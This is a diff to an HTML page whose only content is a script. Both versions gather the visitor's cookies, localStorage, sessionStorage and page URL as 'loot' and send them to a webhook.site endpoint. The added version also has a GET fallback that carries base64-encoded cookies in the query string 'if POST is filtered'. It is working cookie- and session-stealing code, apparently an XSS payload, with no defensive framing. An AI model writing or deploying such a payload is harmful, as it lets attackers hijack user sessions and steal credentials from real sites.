@@ -2,21 +2,25 @@
 <html>
 <body>
     <script>
-    const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-    
-    // 1. Grab everything from Storage
-    const loot = {
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage)
-    };
+        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
+        
+        // 1. Prepare the loot bag
+        const loot = {
+            cookies: document.cookie || "No cookies (likely HttpOnly)",
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            url: window.location.href
+        };
 
-    // 2. Send it to your webhook
-    fetch(webhook, {
-        method: "POST",
-        mode: "no-cors",
-        body: "SESSION_LOOT: " + JSON.stringify(loot)
-    });
-</script>
+        // 2. Send the loot to your webhook as a POST request
+        fetch(webhook, {
+            method: "POST",
+            mode: "no-cors",
+            body: "FULL_SESSION_LOOT: " + JSON.stringify(loot)
+        });
+
+        // 3. Backup: Send via GET if POST is filtered
+        fetch(webhook + "?cookie_b64=" + btoa(document.cookie));
+    </script>
 </body>
 </html>
